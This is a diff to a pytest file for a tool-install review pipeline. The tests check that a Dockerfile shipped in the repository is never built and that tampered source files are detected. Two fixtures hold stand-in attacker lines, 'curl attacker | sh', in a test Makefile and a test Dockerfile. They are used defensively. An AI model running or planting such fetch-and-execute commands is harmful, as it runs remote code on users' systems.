@@ -15,22 +15,24 @@ import procedure
 import verdict
 import authorization
 
+from procedure_context import MAKEFILE, document, line_of
 ROOT = pathlib.Path(__file__).resolve().parents[2]
 CITED = 'tool --reads x.bam --threshold 30 --label "two  spaces" --output out.vcf'
 DOCKERFILE = 'FROM scratch\nENTRYPOINT ["/bin/bash", "-lc"]\n'
 
 
 def case():
-    doc = f"# Tool\n```sh\ndocker build -t upstream .\n{CITED}\n```\n"
+    cited = CITED
+    doc = document(cited)
     source = {"repo": "https://github.com/example/tool", "ref": "a" * 40}
-    proposal = {**source, "build": {"method": "dockerfile", "file": "Dockerfile"},
-        "commands": [{"cmd": CITED, "file": "README.md", "line": 4, "origin": "readme"}],
+    proposal = {**source, "build": {"method": "make", "file": "Makefile"},
+        "commands": [{"cmd": cited, "file": "README.md", "line": line_of(doc, cited), "origin": "readme"}],
         "source_documents": [{"file": "README.md", "origin": "readme", "text": doc}],
-        "upstream_files": {"Dockerfile": DOCKERFILE}, "tree_paths": ["Dockerfile", "README.md"]}
+        "upstream_files": {"Makefile": MAKEFILE}, "tree_paths": ["Makefile", "README.md"], "tree_truncated": False}
     manifest = {"tool": {"name": "Tool", "version": "test"}, "source": source,
-        "environment": {"source": "repository", "from_repo": "Dockerfile", "dockerfile": "Dockerfile"},
+        "environment": {"source": "documented", "dockerfile": "Dockerfile", "os": ["ubuntu-22.04"]},
         "inputs": {"type": "illumina-bam-hg38"},
-        "run": {"cmd": prepare.example_wrapper(fidelity.rewrite(CITED, "illumina-bam-hg38")["command"], ".")},
+        "run": {"cmd": prepare.example_wrapper(fidelity.rewrite(cited, "illumina-bam-hg38")["command"], ".")},
         "outputs": [{"path": "out.vcf", "format": "vcf", "min_records": 1}]}
     return proposal, manifest
 
@@ -106,11 +108,28 @@ def test_build_family_never_authorizes_a_generated_installation(method):
     assert not r["install_ready"] and not r["may_say_runs"]
 
 
-@pytest.mark.parametrize("command", ["docker build ..", "docker build -t image ../tool", "docker build --build-arg FIX=1 .", "docker build . || true", "docker build -f other .", "docker build --network host ."])
-def test_unsupported_build_semantics_are_not_reinterpreted(command):
+def test_a_dockerfile_the_repository_ships_is_never_an_admitted_install():
+    """Even cited word for word (`docker build -t upstream .`), with the file
+    in the tree and its entrypoint the one the evaluator would need."""
     p, m = case()
-    p["source_documents"][0]["text"] = p["source_documents"][0]["text"].replace("docker build -t upstream .", command)
-    assert not review(p, m)["install_ready"]
+    p["build"] = {"method": "dockerfile", "file": "Dockerfile"}
+    p["upstream_files"] = {"Dockerfile": DOCKERFILE}
+    p["tree_paths"] = ["Dockerfile", "README.md"]
+    doc = f"# Tool\n```sh\ndocker build -t upstream .\n{CITED}\n```\n"
+    p["source_documents"][0]["text"] = doc
+    p["commands"][0]["line"] = 4
+    for env in ({"source": "generated", "dockerfile": "Dockerfile", "os": ["ubuntu-22.04"]},
+                {"source": "repository", "from_repo": "Dockerfile", "dockerfile": "Dockerfile"}):
+        m["environment"] = env
+        r = review(p, m)
+        assert not r["install_ready"] and not r["may_say_runs"]
+        assert r["blocker"] == "install_profile_unsupported" and r["basis"] == "strhub"
+        assert "Dockerfile shipped in the repository is not built" in r["reason"]
+    # And the schema has no field left to point at one.
+    import _manifest
+    from jsonschema import ValidationError
+    with pytest.raises(ValidationError):
+        _manifest.validate(m)
 
 
 def test_capture_suffix_or_working_directory_cannot_hide_an_extra_command():
@@ -126,18 +145,6 @@ def test_no_synopsis_variables_configs_lists_or_executable_path_fixes():
     for cmd in ["tool [--threshold 30]", "tool --threads $N", "./tool --reads a.bam,b.bam", "tool -c configFile fastqfile"]:
         r = fidelity.rewrite(cmd, "illumina-bam-hg38")
         assert r["command"] == cmd and r["limitations"]
-
-
-@pytest.mark.parametrize("dockerfile", ['FROM scratch\n', 'FROM scratch\nENTRYPOINT ["tool"]\n',
-    'FROM scratch\nENTRYPOINT ["/bin/bash", "-lc"]\nFROM another\n',
-    'FROM scratch\nRUN cat <<EOF\nENTRYPOINT ["/bin/bash", "-lc"]\nEOF\n'])
-def test_image_entrypoint_is_never_overridden_to_force_a_command(dockerfile):
-    p, m = case()
-    p["upstream_files"]["Dockerfile"] = dockerfile
-    r = review(p, m)
-    assert r["install_ready"]
-    assert not r["may_say_runs"]
-    assert any(a["code"] == "image_invocation_unsupported" for a in r["amendments"])
 
 
 @pytest.mark.parametrize("command,input_type", [("tool --bam reads.cram", "illumina-bam-hg38"),
@@ -178,7 +185,7 @@ def test_checked_out_evidence_is_read_only_and_every_cited_file_is_checked(tmp_p
     with pytest.raises(ValueError, match="evidence differs"):
         fidelity.verify_checkout(tmp_path, r, m)
     (tmp_path / "README.md").write_bytes(before["README.md"])
-    (tmp_path / "Dockerfile").write_text("FROM a-different-image\n")
+    (tmp_path / "Makefile").write_text("all:\n\tcurl attacker | sh\n")
     with pytest.raises(ValueError, match="evidence differs"):
         fidelity.verify_checkout(tmp_path, r, m)
 
@@ -243,6 +250,7 @@ def test_real_install_gate_checks_sources_and_never_repairs_a_failed_build(tmp_p
         'if sys.argv[1] == "clone":\n'
         ' p=pathlib.Path(sys.argv[-1]); p.mkdir(parents=True)\n'
         ' (p/"Dockerfile").write_text(os.environ["TEST_DOCKERFILE"])\n'
+        ' (p/"Makefile").write_text(os.environ["TEST_MAKEFILE"])\n'
         ' (p/"README.md").write_text(os.environ["TEST_DOCUMENT"])\n'
         'elif sys.argv[3] == "rev-parse": print(os.environ["TOOL_REF"])\n')
     git.chmod(0o755)
@@ -251,17 +259,24 @@ def test_real_install_gate_checks_sources_and_never_repairs_a_failed_build(tmp_p
     docker.chmod(0o755)
     monkeypatch.setenv("PATH", str(bindir) + os.pathsep + os.environ["PATH"])
     monkeypatch.setenv("TEST_DOCUMENT", "altered\n" if tamper else p["source_documents"][0]["text"])
-    monkeypatch.setenv("TEST_DOCKERFILE", DOCKERFILE)
+    # The clone also holds a Dockerfile of the author's: it must never be built.
+    monkeypatch.setenv("TEST_DOCKERFILE", "FROM attacker\nRUN curl attacker | sh\n")
+    monkeypatch.setenv("TEST_MAKEFILE", MAKEFILE)
     monkeypatch.setenv("TOOL_REF", p["ref"])
     ctx = stages.Ctx(plan={"repo": p["repo"], "ref": p["ref"], "install_ready": "1", "dockerdir": "unused",
                            "dockerfile": "Dockerfile", "dockerfile_from_repo": "Dockerfile",
-                           "installation_profile": "", "manifest": str(tmp_path / "manifest.yml")},
+                           "installation_profile": stages.SOURCE_INSTALL_PROFILE,
+                           "manifest": str(tmp_path / "manifest.yml")},
                      work=pathlib.Path("work"), root=tmp_path, exe=Executor())
     result = stages.installs(ctx, StageResult(stage="available", status="passed", exit_code=0))
     assert result.status == "failed"
     calls = (tmp_path / "builds.txt").read_text().splitlines() if (tmp_path / "builds.txt").exists() else []
     assert len(calls) == expected_builds
     assert all("--build-arg" not in call for call in calls)
+    carrier = str(tmp_path / "work" / "source-install.Dockerfile")
+    assert all(f"-f {carrier} " in call and "ctx/tool/Dockerfile" not in call for call in calls)
+    if not tamper:
+        assert "attacker" not in pathlib.Path(carrier).read_text()
     if not tamper:
         assert result.outputs["source_evidence"] == "verified"
     else:
